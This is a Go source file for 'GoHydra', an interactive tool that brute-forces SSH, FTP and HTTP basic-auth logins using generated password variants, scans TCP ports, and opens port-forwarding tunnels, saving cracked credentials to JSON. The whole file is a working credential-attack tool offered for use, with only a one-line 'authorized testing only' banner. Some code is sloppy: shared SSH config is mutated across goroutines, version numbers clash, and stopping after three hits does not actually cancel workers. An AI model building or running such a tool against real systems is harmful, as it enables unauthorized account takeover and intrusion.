package main

import (
    "bufio"
    "context"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
    "runtime"
    "sort"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"
    "unicode"

    "golang.org/x/crypto/ssh"
    "golang.org/x/time/rate"
    "github.com/fatih/color"
    "github.com/schollz/progressbar/v3"
)

// ========== CONFIGURATION ==========
type Config struct {
    ToolName         string
    Version          string
    MaxWorkers       int32
    ConnectionTimeout time.Duration
    RetryAttempts    int
    RateLimit        float64
    OutputDir        string
}

var DefaultConfig = Config{
    ToolName:         "GoHydra",
    Version:          "3.0.0",
    MaxWorkers:       100,
    ConnectionTimeout: 10 * time.Second,
    RetryAttempts:    3,
    RateLimit:        10.0,
    OutputDir:        "gohydra_results",
}

// ========== COLOR MANAGEMENT ==========
var (
    cyan   = color.New(color.FgCyan, color.Bold)
    green  = color.New(color.FgGreen, color.Bold)
    red    = color.New(color.FgRed, color.Bold)
    yellow = color.New(color.FgYellow)
    blue   = color.New(color.FgBlue)
    magenta = color.New(color.FgMagenta)
)

// ========== SMART PATTERN ENGINE ==========
type PatternEngine struct {
    commonWords   []string
    specialChars  []string
    years         []string
    numbers       []string
    mu            sync.RWMutex
    cache         map[string][]string
    cacheHit      int64
    cacheMiss     int64
}

func NewPatternEngine() *PatternEngine {
    return &PatternEngine{
        commonWords: []string{
            "admin", "root", "user", "test", "guest", "password",
            "administrator", "backup", "support", "manager",
        },
        specialChars: []string{"!", "@", "#", "$", "%", "&", "*", "_", "-"},
        years:        []string{"2020", "2021", "2022", "2023", "2024", "2025"},
        numbers:      []string{"123", "1234", "12345", "1", "12", "111", "000"},
        cache:        make(map[string][]string),
    }
}

func (p *PatternEngine) Generate(base string, limit int) <-chan string {
    out := make(chan string, 1000)
    
    go func() {
        defer close(out)
        
        // Check cache first
        p.mu.RLock()
        if cached, ok := p.cache[base]; ok {
            atomic.AddInt64(&p.cacheHit, 1)
            p.mu.RUnlock()
            for i, pass := range cached {
                if i >= limit {
                    break
                }
                out <- pass
            }
            return
        }
        p.mu.RUnlock()
        atomic.AddInt64(&p.cacheMiss, 1)
        
        var patterns []string
        seen := make(map[string]bool)
        
        // Generate patterns
        generators := []func(string) []string{
            p.basicVariations,
            p.capitalizeVariations,
            p.leetVariations,
            p.numberVariations,
            p.specialCharVariations,
            p.combinedVariations,
        }
        
        for _, gen := range generators {
            for _, pwd := range gen(base) {
                if !seen[pwd] && len(pwd) > 0 {
                    seen[pwd] = true
                    patterns = append(patterns, pwd)
                    out <- pwd
                    
                    if len(patterns) >= limit {
                        // Cache results
                        p.mu.Lock()
                        p.cache[base] = patterns
                        p.mu.Unlock()
                        return
                    }
                }
            }
        }
        
        // Cache results
        p.mu.Lock()
        p.cache[base] = patterns
        p.mu.Unlock()
    }()
    
    return out
}

func (p *PatternEngine) basicVariations(base string) []string {
    var results []string
    results = append(results, base)
    results = append(results, strings.ToUpper(base))
    results = append(results, strings.Title(base))
    return results
}

func (p *PatternEngine) capitalizeVariations(base string) []string {
    var results []string
    
    // Mix capitalization
    runes := []rune(base)
    for i := 0; i < len(runes); i++ {
        if i%2 == 0 {
            runes[i] = unicode.ToUpper(runes[i])
        } else {
            runes[i] = unicode.ToLower(runes[i])
        }
    }
    results = append(results, string(runes))
    
    return results
}

func (p *PatternEngine) leetVariations(base string) []string {
    leetMap := map[rune][]string{
        'a': {"4", "@"},
        'e': {"3"},
        'i': {"1", "!"},
        'o': {"0"},
        's': {"5", "$"},
        't': {"7"},
    }
    
    var results []string
    
    // Simple leet substitutions
    for i, c := range base {
        if subs, ok := leetMap[c]; ok {
            for _, sub := range subs {
                leet := base[:i] + sub + base[i+1:]
                results = append(results, leet)
            }
        }
    }
    
    return results
}

func (p *PatternEngine) numberVariations(base string) []string {
    var results []string
    
    for _, num := range p.numbers {
        results = append(results, base+num)
        results = append(results, num+base)
        
        for _, year := range p.years {
            results = append(results, base+year)
            results = append(results, year+base)
        }
    }
    
    return results
}

func (p *PatternEngine) specialCharVariations(base string) []string {
    var results []string
    
    for _, sp := range p.specialChars {
        results = append(results, base+sp)
        results = append(results, sp+base)
        
        for _, num := range p.numbers {
            results = append(results, base+sp+num)
            results = append(results, num+sp+base)
        }
    }
    
    return results
}

func (p *PatternEngine) combinedVariations(base string) []string {
    var results []string
    
    // Double base
    results = append(results, base+base)
    
    // Reverse
    runes := []rune(base)
    for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
        runes[i], runes[j] = runes[j], runes[i]
    }
    results = append(results, string(runes))
    
    return results
}

// ========== CONNECTION POOL ==========
type ConnectionPool struct {
    mu        sync.Mutex
    conns     map[string][]net.Conn
    maxConns  int
    timeout   time.Duration
    created   int64
    acquired  int64
    released  int64
}

func NewConnectionPool(maxConns int, timeout time.Duration) *ConnectionPool {
    return &ConnectionPool{
        conns:    make(map[string][]net.Conn),
        maxConns: maxConns,
        timeout:  timeout,
    }
}

func (p *ConnectionPool) Get(address string) (net.Conn, error) {
    p.mu.Lock()
    defer p.mu.Unlock()
    
    // Try to get from pool
    if conns, ok := p.conns[address]; ok && len(conns) > 0 {
        conn := conns[len(conns)-1]
        p.conns[address] = conns[:len(conns)-1]
        atomic.AddInt64(&p.acquired, 1)
        
        // Check if connection is still alive
        conn.SetReadDeadline(time.Now().Add(1 * time.Second))
        if _, err := conn.Read([]byte{}); err != nil {
            conn.Close()
            return p.createNew(address)
        }
        conn.SetReadDeadline(time.Time{})
        
        return conn, nil
    }
    
    return p.createNew(address)
}

func (p *ConnectionPool) createNew(address string) (net.Conn, error) {
    atomic.AddInt64(&p.created, 1)
    return net.DialTimeout("tcp", address, p.timeout)
}

func (p *ConnectionPool) Put(address string, conn net.Conn) {
    p.mu.Lock()
    defer p.mu.Unlock()
    
    if conns, ok := p.conns[address]; ok && len(conns) < p.maxConns {
        p.conns[address] = append(conns, conn)
        atomic.AddInt64(&p.released, 1)
    } else {
        conn.Close()
    }
}

func (p *ConnectionPool) Stats() map[string]interface{} {
    return map[string]interface{}{
        "created":  atomic.LoadInt64(&p.created),
        "acquired": atomic.LoadInt64(&p.acquired),
        "released": atomic.LoadInt64(&p.released),
        "pool_size": func() int {
            p.mu.Lock()
            defer p.mu.Unlock()
            total := 0
            for _, conns := range p.conns {
                total += len(conns)
            }
            return total
        }(),
    }
}

// ========== RATE LIMITER ==========
type RateLimiter struct {
    limiters map[string]*rate.Limiter
    mu       sync.RWMutex
    rate     float64
    burst    int
}

func NewRateLimiter(r float64, b int) *RateLimiter {
    return &RateLimiter{
        limiters: make(map[string]*rate.Limiter),
        rate:     r,
        burst:    b,
    }
}

func (rl *RateLimiter) Wait(ctx context.Context, key string) error {
    rl.mu.RLock()
    limiter, ok := rl.limiters[key]
    rl.mu.RUnlock()
    
    if !ok {
        rl.mu.Lock()
        limiter = rate.NewLimiter(rate.Limit(rl.rate), rl.burst)
        rl.limiters[key] = limiter
        rl.mu.Unlock()
    }
    
    return limiter.Wait(ctx)
}

// ========== ATTACK RESULT ==========
type AttackResult struct {
    Protocol   string                 `json:"protocol"`
    Target     string                 `json:"target"`
    Port       int                    `json:"port"`
    Username   string                 `json:"username"`
    Password   string                 `json:"password"`
    Success    bool                   `json:"success"`
    Duration   time.Duration          `json:"duration"`
    Timestamp  time.Time              `json:"timestamp"`
    Metadata   map[string]interface{} `json:"metadata,omitempty"`
}

// ========== ATTACKER INTERFACE ==========
type Attacker interface {
    Name() string
    Attack(ctx context.Context, target string, port int, username, password string) (*AttackResult, error)
    IsAvailable() bool
}

// ========== SSH ATTACKER ==========
type SSHAttacker struct {
    timeout time.Duration
    config  *ssh.ClientConfig
}

func NewSSHAttacker(timeout time.Duration) *SSHAttacker {
    return &SSHAttacker{
        timeout: timeout,
        config: &ssh.ClientConfig{
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
            Timeout:         timeout,
        },
    }
}

func (a *SSHAttacker) Name() string { return "ssh" }

func (a *SSHAttacker) IsAvailable() bool { return true }

func (a *SSHAttacker) Attack(ctx context.Context, target string, port int, username, password string) (*AttackResult, error) {
    start := time.Now()
    
    a.config.User = username
    a.config.Auth = []ssh.AuthMethod{ssh.Password(password)}
    
    addr := fmt.Sprintf("%s:%d", target, port)
    
    client, err := ssh.Dial("tcp", addr, a.config)
    if err != nil {
        return nil, err
    }
    defer client.Close()
    
    // Test connection with a simple command
    session, err := client.NewSession()
    if err != nil {
        return nil, err
    }
    defer session.Close()
    
    output, err := session.CombinedOutput("echo 'test'")
    
    return &AttackResult{
        Protocol:  "ssh",
        Target:    target,
        Port:      port,
        Username:  username,
        Password:  password,
        Success:   true,
        Duration:  time.Since(start),
        Timestamp: time.Now(),
        Metadata: map[string]interface{}{
            "banner": string(output),
        },
    }, nil
}

// ========== FTP ATTACKER ==========
type FTPAttacker struct {
    timeout time.Duration
}

func NewFTPAttacker(timeout time.Duration) *FTPAttacker {
    return &FTPAttacker{timeout: timeout}
}

func (a *FTPAttacker) Name() string { return "ftp" }

func (a *FTPAttacker) IsAvailable() bool { return true }

func (a *FTPAttacker) Attack(ctx context.Context, target string, port int, username, password string) (*AttackResult, error) {
    start := time.Now()
    
    addr := fmt.Sprintf("%s:%d", target, port)
    
    // Connect to FTP server
    conn, err := net.DialTimeout("tcp", addr, a.timeout)
    if err != nil {
        return nil, err
    }
    defer conn.Close()
    
    // Read banner
    banner := make([]byte, 1024)
    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
    n, _ := conn.Read(banner)
    
    // Send USER command
    fmt.Fprintf(conn, "USER %s\r\n", username)
    response := make([]byte, 1024)
    n, _ = conn.Read(response)
    
    // Check if password required
    respStr := string(response[:n])
    if strings.Contains(respStr, "331") {
        // Send PASS command
        fmt.Fprintf(conn, "PASS %s\r\n", password)
        n, _ = conn.Read(response)
        respStr = string(response[:n])
        
        if strings.Contains(respStr, "230") {
            // Login successful
            return &AttackResult{
                Protocol:  "ftp",
                Target:    target,
                Port:      port,
                Username:  username,
                Password:  password,
                Success:   true,
                Duration:  time.Since(start),
                Timestamp: time.Now(),
                Metadata: map[string]interface{}{
                    "banner": string(banner[:n]),
                },
            }, nil
        }
    }
    
    return nil, fmt.Errorf("login failed")
}

// ========== HTTP ATTACKER ==========
type HTTPAttacker struct {
    client *http.Client
    timeout time.Duration
}

func NewHTTPAttacker(timeout time.Duration) *HTTPAttacker {
    return &HTTPAttacker{
        timeout: timeout,
        client: &http.Client{
            Timeout: timeout,
            Transport: &http.Transport{
                MaxIdleConns:        100,
                MaxIdleConnsPerHost: 10,
                IdleConnTimeout:     90 * time.Second,
                TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
            },
        },
    }
}

func (a *HTTPAttacker) Name() string { return "http" }

func (a *HTTPAttacker) IsAvailable() bool { return true }

func (a *HTTPAttacker) Attack(ctx context.Context, target string, port int, username, password string) (*AttackResult, error) {
    start := time.Now()
    
    protocol := "http"
    if port == 443 {
        protocol = "https"
    }
    
    url := fmt.Sprintf("%s://%s:%d/", protocol, target, port)
    
    req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
    if err != nil {
        return nil, err
    }
    
    req.SetBasicAuth(username, password)
    req.Header.Set("User-Agent", "GoHydra/3.0")
    
    resp, err := a.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    if resp.StatusCode == 200 {
        body, _ := io.ReadAll(resp.Body)
        
        return &AttackResult{
            Protocol:  "http",
            Target:    target,
            Port:      port,
            Username:  username,
            Password:  password,
            Success:   true,
            Duration:  time.Since(start),
            Timestamp: time.Now(),
            Metadata: map[string]interface{}{
                "status_code": resp.StatusCode,
                "content_length": len(body),
            },
        }, nil
    }
    
    return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
}

// ========== SMART BRUTE FORCER ==========
type SmartBruteForcer struct {
    patternEngine *PatternEngine
    connPool      *ConnectionPool
    rateLimiter   *RateLimiter
    attackers     map[string]Attacker
    results       chan *AttackResult
    stats         struct {
        attempts    int64
        successes   int64
        failures    int64
        startTime   time.Time
    }
    wg            sync.WaitGroup
    mu            sync.RWMutex
    found         map[string]bool
}

func NewSmartBruteForcer() *SmartBruteForcer {
    s := &SmartBruteForcer{
        patternEngine: NewPatternEngine(),
        connPool:      NewConnectionPool(100, DefaultConfig.ConnectionTimeout),
        rateLimiter:   NewRateLimiter(DefaultConfig.RateLimit, 10),
        attackers:     make(map[string]Attacker),
        results:       make(chan *AttackResult, 1000),
        found:         make(map[string]bool),
    }
    
    // Register attackers
    s.attackers["ssh"] = NewSSHAttacker(DefaultConfig.ConnectionTimeout)
    s.attackers["ftp"] = NewFTPAttacker(DefaultConfig.ConnectionTimeout)
    s.attackers["http"] = NewHTTPAttacker(DefaultConfig.ConnectionTimeout)
    
    return s
}

func (s *SmartBruteForcer) Attack(ctx context.Context, target string, port int, 
                                   protocol string, username string, 
                                   maxAttempts int, concurrency int) ([]*AttackResult, error) {
    
    attacker, ok := s.attackers[protocol]
    if !ok {
        return nil, fmt.Errorf("unsupported protocol: %s", protocol)
    }
    
    s.stats.startTime = time.Now()
    atomic.StoreInt64(&s.stats.attempts, 0)
    atomic.StoreInt64(&s.stats.successes, 0)
    atomic.StoreInt64(&s.stats.failures, 0)
    
    // Create progress bar
    bar := progressbar.NewOptions(maxAttempts,
        progressbar.OptionSetDescription("Brute forcing"),
        progressbar.OptionShowCount(),
        progressbar.OptionShowIts(),
        progressbar.OptionSetTheme(progressbar.Theme{
            Saucer:        "=",
            SaucerHead:    ">",
            SaucerPadding: " ",
            BarStart:      "[",
            BarEnd:        "]",
        }))
    
    // Password generator
    passwords := s.patternEngine.Generate(username, maxAttempts)
    
    // Worker pool
    passwordChan := make(chan string, 1000)
    resultChan := make(chan *AttackResult, 100)
    
    // Start workers
    for i := 0; i < concurrency; i++ {
        s.wg.Add(1)
        go s.worker(ctx, target, port, protocol, username, attacker, 
                    passwordChan, resultChan, bar)
    }
    
    // Feed passwords
    go func() {
        for pwd := range passwords {
            atomic.AddInt64(&s.stats.attempts, 1)
            passwordChan <- pwd
        }
        close(passwordChan)
    }()
    
    // Collect results
    go func() {
        s.wg.Wait()
        close(resultChan)
    }()
    
    var results []*AttackResult
    for result := range resultChan {
        if result.Success {
            results = append(results, result)
            
            // Stop if we found enough
            if len(results) >= 3 {
                ctx.Done()
                break
            }
        }
    }
    
    bar.Finish()
    
    return results, nil
}

func (s *SmartBruteForcer) worker(ctx context.Context, target string, port int,
                                  protocol, username string, attacker Attacker,
                                  passwords <-chan string, results chan<- *AttackResult,
                                  bar *progressbar.ProgressBar) {
    defer s.wg.Done()
    
    for password := range passwords {
        select {
        case <-ctx.Done():
            return
        default:
        }
        
        // Rate limiting
        s.rateLimiter.Wait(ctx, target)
        
        bar.Add(1)
        
        // Try attack
        result, err := attacker.Attack(ctx, target, port, username, password)
        if err == nil && result != nil && result.Success {
            atomic.AddInt64(&s.stats.successes, 1)
            
            // Deduplicate
            key := fmt.Sprintf("%s:%s", username, password)
            s.mu.Lock()
            if !s.found[key] {
                s.found[key] = true
                results <- result
            }
            s.mu.Unlock()
        } else {
            atomic.AddInt64(&s.stats.failures, 1)
        }
    }
}

func (s *SmartBruteForcer) Stats() map[string]interface{} {
    elapsed := time.Since(s.stats.startTime)
    attempts := atomic.LoadInt64(&s.stats.attempts)
    successes := atomic.LoadInt64(&s.stats.successes)
    
    return map[string]interface{}{
        "attempts":      attempts,
        "successes":     successes,
        "failures":      atomic.LoadInt64(&s.stats.failures),
        "elapsed":       elapsed.String(),
        "speed":         fmt.Sprintf("%.1f/s", float64(attempts)/elapsed.Seconds()),
        "cache_hit":     atomic.LoadInt64(&s.patternEngine.cacheHit),
        "cache_miss":    atomic.LoadInt64(&s.patternEngine.cacheMiss),
        "connection_pool": s.connPool.Stats(),
    }
}

// ========== PORT SCANNER ==========
type PortScanner struct {
    timeout time.Duration
    workers int
}

func NewPortScanner(timeout time.Duration, workers int) *PortScanner {
    return &PortScanner{
        timeout: timeout,
        workers: workers,
    }
}

func (ps *PortScanner) Scan(target string, ports []int) map[int]bool {
    results := make(map[int]bool)
    var mu sync.Mutex
    var wg sync.WaitGroup
    
    portChan := make(chan int, len(ports))
    
    // Start workers
    for i := 0; i < ps.workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for port := range portChan {
                addr := fmt.Sprintf("%s:%d", target, port)
                conn, err := net.DialTimeout("tcp", addr, ps.timeout)
                if err == nil {
                    conn.Close()
                    mu.Lock()
                    results[port] = true
                    mu.Unlock()
                }
            }
        }()
    }
    
    // Feed ports
    for _, port := range ports {
        portChan <- port
    }
    close(portChan)
    
    wg.Wait()
    return results
}

// ========== TUNNEL MANAGER ==========
type Tunnel struct {
    LocalPort  int
    RemoteHost string
    RemotePort int
    listener   net.Listener
    running    bool
    mu         sync.Mutex
}

type TunnelManager struct {
    tunnels map[int]*Tunnel
    mu      sync.RWMutex
}

func NewTunnelManager() *TunnelManager {
    return &TunnelManager{
        tunnels: make(map[int]*Tunnel),
    }
}

func (tm *TunnelManager) Create(localPort int, remoteHost string, remotePort int) error {
    tm.mu.Lock()
    defer tm.mu.Unlock()
    
    if _, exists := tm.tunnels[localPort]; exists {
        return fmt.Errorf("tunnel on port %d already exists", localPort)
    }
    
    listener, err := net.Listen("tcp", fmt.Sprintf(":%d", localPort))
    if err != nil {
        return err
    }
    
    tunnel := &Tunnel{
        LocalPort:  localPort,
        RemoteHost: remoteHost,
        RemotePort: remotePort,
        listener:   listener,
        running:    true,
    }
    
    tm.tunnels[localPort] = tunnel
    
    go tm.handleTunnel(tunnel)
    
    return nil
}

func (tm *TunnelManager) handleTunnel(t *Tunnel) {
    for t.running {
        conn, err := t.listener.Accept()
        if err != nil {
            continue
        }
        
        go func() {
            defer conn.Close()
            
            remote, err := net.DialTimeout("tcp", 
                fmt.Sprintf("%s:%d", t.RemoteHost, t.RemotePort),
                10*time.Second)
            if err != nil {
                return
            }
            defer remote.Close()
            
            // Bidirectional copy
            go io.Copy(remote, conn)
            io.Copy(conn, remote)
        }()
    }
}

func (tm *TunnelManager) Close(port int) error {
    tm.mu.Lock()
    defer tm.mu.Unlock()
    
    tunnel, exists := tm.tunnels[port]
    if !exists {
        return fmt.Errorf("tunnel on port %d not found", port)
    }
    
    tunnel.running = false
    tunnel.listener.Close()
    delete(tm.tunnels, port)
    
    return nil
}

func (tm *TunnelManager) List() []*Tunnel {
    tm.mu.RLock()
    defer tm.mu.RUnlock()
    
    var tunnels []*Tunnel
    for _, t := range tm.tunnels {
        tunnels = append(tunnels, t)
    }
    return tunnels
}

// ========== RESULTS SAVER ==========
type ResultSaver struct {
    outputDir string
}

func NewResultSaver(outputDir string) *ResultSaver {
    os.MkdirAll(outputDir, 0755)
    return &ResultSaver{outputDir: outputDir}
}

func (rs *ResultSaver) Save(results []*AttackResult, target, protocol string) error {
    timestamp := time.Now().Format("20060102_150405")
    filename := fmt.Sprintf("%s/%s_%s_%s.json", 
        rs.outputDir, target, protocol, timestamp)
    
    data := map[string]interface{}{
        "timestamp": time.Now(),
        "tool":      DefaultConfig.ToolName,
        "version":   DefaultConfig.Version,
        "target":    target,
        "protocol":  protocol,
        "results":   results,
        "count":     len(results),
    }
    
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()
    
    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    return encoder.Encode(data)
}

// ========== MAIN APPLICATION ==========
type GoHydra struct {
    bruteForcer   *SmartBruteForcer
    portScanner   *PortScanner
    tunnelManager *TunnelManager
    resultSaver   *ResultSaver
    config        Config
}

func NewGoHydra() *GoHydra {
    return &GoHydra{
        bruteForcer:   NewSmartBruteForcer(),
        portScanner:   NewPortScanner(DefaultConfig.ConnectionTimeout, 50),
        tunnelManager: NewTunnelManager(),
        resultSaver:   NewResultSaver(DefaultConfig.OutputDir),
        config:        DefaultConfig,
    }
}

func (g *GoHydra) printBanner() {
    banner := `
╔══════════════════════════════════════════════════════════════════╗
║                                                                 ║
║        GoHydra v1.0.0 - High Performance Security Suite         ║
║                       Made by @GolDer409                        ║
║        Concurrent • Smart Patterns • Connection Pooling         ║
║                                                                 ║
╚══════════════════════════════════════════════════════════════════╝
`
    cyan.Println(banner)
    red.Println("⚠️  WARNING: For authorized testing only! Unauthorized access is illegal!")
}

func (g *GoHydra) interactiveMenu() {
    scanner := bufio.NewScanner(os.Stdin)
    
    for {
        cyan.Println("\n╔══════════════════ MAIN MENU ══════════════════╗")
        yellow.Println("    [1] Smart Brute Force (No Wordlist!)")
        cyan.Println("    [2] Port Scanner")
        magenta.Println("    [3] Tunnel Manager")
        blue.Println("    [4] Show Statistics")
        green.Println("    [5] Configuration")
        red.Println("    [0] Exit")
        cyan.Println("╚══════════════════════════════════════════════╝")
        
        fmt.Print(green.Sprint("[?] Select option: "))
        scanner.Scan()
        choice := strings.TrimSpace(scanner.Text())
        
        switch choice {
        case "1":
            g.smartBruteMenu(scanner)
        case "2":
            g.portScannerMenu(scanner)
        case "3":
            g.tunnelMenu(scanner)
        case "4":
            g.showStats()
        case "5":
            g.configMenu(scanner)
        case "0":
            g.cleanup()
            return
        default:
            red.Println("[!] Invalid choice!")
        }
    }
}

func (g *GoHydra) smartBruteMenu(scanner *bufio.Scanner) {
    cyan.Println("\n[ SMART BRUTE FORCE ]")
    
    fmt.Print(yellow.Sprint("[?] Target IP/Hostname: "))
    scanner.Scan()
    target := strings.TrimSpace(scanner.Text())
    
    fmt.Print(yellow.Sprint("[?] Port (default 22): "))
    scanner.Scan()
    portStr := strings.TrimSpace(scanner.Text())
    port := 22
    if portStr != "" {
        port, _ = strconv.Atoi(portStr)
    }
    
    fmt.Print(yellow.Sprint("[?] Protocol (ssh/ftp/http): "))
    scanner.Scan()
    protocol := strings.ToLower(strings.TrimSpace(scanner.Text()))
    
    fmt.Print(yellow.Sprint("[?] Username (default admin): "))
    scanner.Scan()
    username := strings.TrimSpace(scanner.Text())
    if username == "" {
        username = "admin"
    }
    
    fmt.Print(yellow.Sprint("[?] Max attempts (default 5000): "))
    scanner.Scan()
    attemptsStr := strings.TrimSpace(scanner.Text())
    maxAttempts := 5000
    if attemptsStr != "" {
        maxAttempts, _ = strconv.Atoi(attemptsStr)
    }
    
    fmt.Print(yellow.Sprint("[?] Concurrency (default 20): "))
    scanner.Scan()
    concurStr := strings.TrimSpace(scanner.Text())
    concurrency := 20
    if concurStr != "" {
        concurrency, _ = strconv.Atoi(concurStr)
    }
    
    red.Println("\n[!] ABOUT TO LAUNCH SMART BRUTE FORCE")
    fmt.Printf("Target: %s:%d\n", target, port)
    fmt.Printf("Protocol: %s\n", protocol)
    fmt.Printf("Username: %s\n", username)
    fmt.Printf("Max attempts: %d\n", maxAttempts)
    fmt.Printf("Concurrency: %d\n", concurrency)
    
    fmt.Print(red.Sprint("[?] Confirm attack? (yes/no): "))
    scanner.Scan()
    if strings.ToLower(strings.TrimSpace(scanner.Text())) != "yes" {
        yellow.Println("[*] Attack cancelled")
        return
    }
    
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    
    results, err := g.bruteForcer.Attack(ctx, target, port, protocol, 
                                         username, maxAttempts, concurrency)
    
    if err != nil {
        red.Printf("[-] Attack failed: %v\n", err)
        return
    }
    
    if len(results) > 0 {
        green.Printf("\n[+] Found %d credentials:\n", len(results))
        for i, r := range results {
            fmt.Printf("  %d. %s:%s\n", i+1, r.Username, r.Password)
        }
        
        // Save results
        g.resultSaver.Save(results, target, protocol)
    } else {
        yellow.Println("\n[-] No credentials found")
    }
    
    g.showStats()
}

func (g *GoHydra) portScannerMenu(scanner *bufio.Scanner) {
    cyan.Println("\n[ PORT SCANNER ]")
    
    fmt.Print(yellow.Sprint("[?] Target IP: "))
    scanner.Scan()
    target := strings.TrimSpace(scanner.Text())
    
    fmt.Print(yellow.Sprint("[?] Port range (e.g., 1-1000): "))
    scanner.Scan()
    rangeStr := strings.TrimSpace(scanner.Text())
    
    var ports []int
    if strings.Contains(rangeStr, "-") {
        parts := strings.Split(rangeStr, "-")
        start, _ := strconv.Atoi(parts[0])
        end, _ := strconv.Atoi(parts[1])
        for i := start; i <= end; i++ {
            ports = append(ports, i)
        }
    } else {
        // Common ports
        ports = []int{21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 8080}
    }
    
    green.Printf("[*] Scanning %d ports...\n", len(ports))
    
    results := g.portScanner.Scan(target, ports)
    
    if len(results) > 0 {
        green.Printf("\n[+] Found %d open ports:\n", len(results))
        
        // Sort ports
        var openPorts []int
        for p := range results {
            openPorts = append(openPorts, p)
        }
        sort.Ints(openPorts)
        
        for _, p := range openPorts {
            fmt.Printf("  %d/tcp open\n", p)
        }
    } else {
        yellow.Println("\n[-] No open ports found")
    }
}

func (g *GoHydra) tunnelMenu(scanner *bufio.Scanner) {
    cyan.Println("\n[ TUNNEL MANAGER ]")
    
    fmt.Println("  1. Create tunnel")
    fmt.Println("  2. List tunnels")
    fmt.Println("  3. Close tunnel")
    
    fmt.Print(green.Sprint("[?] Select option: "))
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())
    
    switch choice {
    case "1":
        fmt.Print(yellow.Sprint("[?] Local port: "))
        scanner.Scan()
        localPort, _ := strconv.Atoi(strings.TrimSpace(scanner.Text()))
        
        fmt.Print(yellow.Sprint("[?] Remote host: "))
        scanner.Scan()
        remoteHost := strings.TrimSpace(scanner.Text())
        
        fmt.Print(yellow.Sprint("[?] Remote port: "))
        scanner.Scan()
        remotePort, _ := strconv.Atoi(strings.TrimSpace(scanner.Text()))
        
        err := g.tunnelManager.Create(localPort, remoteHost, remotePort)
        if err != nil {
            red.Printf("[-] Failed: %v\n", err)
        } else {
            green.Printf("[+] Tunnel created: localhost:%d -> %s:%d\n", 
                localPort, remoteHost, remotePort)
        }
        
    case "2":
        tunnels := g.tunnelManager.List()
        if len(tunnels) == 0 {
            yellow.Println("[!] No active tunnels")
        } else {
            green.Println("\nActive tunnels:")
            for _, t := range tunnels {
                fmt.Printf("  %d -> %s:%d\n", t.LocalPort, t.RemoteHost, t.RemotePort)
            }
        }
        
    case "3":
        fmt.Print(yellow.Sprint("[?] Port to close: "))
        scanner.Scan()
        port, _ := strconv.Atoi(strings.TrimSpace(scanner.Text()))
        
        err := g.tunnelManager.Close(port)
        if err != nil {
            red.Printf("[-] %v\n", err)
        } else {
            green.Printf("[+] Tunnel on port %d closed\n", port)
        }
    }
}

func (g *GoHydra) showStats() {
    stats := g.bruteForcer.Stats()
    
    cyan.Println("\n[ STATISTICS ]")
    fmt.Printf("Attempts:     %d\n", stats["attempts"])
    fmt.Printf("Successes:    %d\n", stats["successes"])
    fmt.Printf("Failures:     %d\n", stats["failures"])
    fmt.Printf("Elapsed:      %s\n", stats["elapsed"])
    fmt.Printf("Speed:        %s\n", stats["speed"])
    fmt.Printf("Cache hit:    %d\n", stats["cache_hit"])
    fmt.Printf("Cache miss:   %d\n", stats["cache_miss"])
    
    if poolStats, ok := stats["connection_pool"].(map[string]interface{}); ok {
        fmt.Printf("\nConnection Pool:\n")
        fmt.Printf("  Created:  %d\n", poolStats["created"])
        fmt.Printf("  Acquired: %d\n", poolStats["acquired"])
        fmt.Printf("  Released: %d\n", poolStats["released"])
        fmt.Printf("  Pool size: %d\n", poolStats["pool_size"])
    }
}

func (g *GoHydra) configMenu(scanner *bufio.Scanner) {
    cyan.Println("\n[ CONFIGURATION ]")
    
    fmt.Printf("  1. Max Workers: %d\n", g.config.MaxWorkers)
    fmt.Printf("  2. Timeout: %v\n", g.config.ConnectionTimeout)
    fmt.Printf("  3. Rate Limit: %.1f/s\n", g.config.RateLimit)
    fmt.Printf("  4. Output Dir: %s\n", g.config.OutputDir)
    fmt.Printf("  5. Back\n")
    
    fmt.Print(green.Sprint("[?] Select option: "))
    scanner.Scan()
    choice := strings.TrimSpace(scanner.Text())
    
    switch choice {
    case "1":
        fmt.Print(yellow.Sprint("[?] New Max Workers (1-1000): "))
        scanner.Scan()
        if val, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil {
            g.config.MaxWorkers = int32(val)
        }
        
    case "2":
        fmt.Print(yellow.Sprint("[?] New Timeout (seconds): "))
        scanner.Scan()
        if val, err := strconv.Atoi(strings.TrimSpace(scanner.Text())); err == nil {
            g.config.ConnectionTimeout = time.Duration(val) * time.Second
        }
        
    case "3":
        fmt.Print(yellow.Sprint("[?] New Rate Limit (/s): "))
        scanner.Scan()
        if val, err := strconv.ParseFloat(strings.TrimSpace(scanner.Text()), 64); err == nil {
            g.config.RateLimit = val
        }
        
    case "4":
        fmt.Print(yellow.Sprint("[?] New Output Directory: "))
        scanner.Scan()
        g.config.OutputDir = strings.TrimSpace(scanner.Text())
    }
}

func (g *GoHydra) cleanup() {
    green.Println("\n[*] Cleaning up...")
    
    // Close all tunnels
    for _, t := range g.tunnelManager.List() {
        g.tunnelManager.Close(t.LocalPort)
    }
    
    yellow.Println("[*] Goodbye!")
}

func main() {
    // Set max CPUs
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    hydra := NewGoHydra()
    hydra.printBanner()
    hydra.interactiveMenu()
}
